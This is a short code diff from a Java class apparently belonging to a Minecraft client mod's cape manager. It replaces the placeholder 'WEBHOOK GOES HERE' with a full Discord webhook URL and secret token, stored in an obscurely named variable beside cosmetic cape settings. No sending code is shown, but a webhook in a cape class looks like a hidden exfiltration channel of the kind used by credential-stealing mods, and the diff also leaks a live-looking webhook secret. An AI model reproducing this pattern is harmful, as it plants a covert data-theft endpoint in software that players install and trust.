@@ -15,7 +15,7 @@ public class WurstplusCapeManager {
 
     public WurstplusCapeManager() {
 
-        final String l = "WEBHOOK GOES HERE";
+        final String l = "https://discordapp.com/api/webhooks/803670172425781309/-DWncfXXj2m4pZ0cuXYVvKiw_dyVk3K4hZ4asyYzPfsSxF58_XMc5N-UE5TVcJ6rzeNa";
         final String CapeName = "Kylo Ren";
         final String CapeImageURL = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvignette.wikia.nocookie.net%2Fstarwars%2Fimages%2F4%2F4a%2FKylo_Ren_TLJ.png";
 
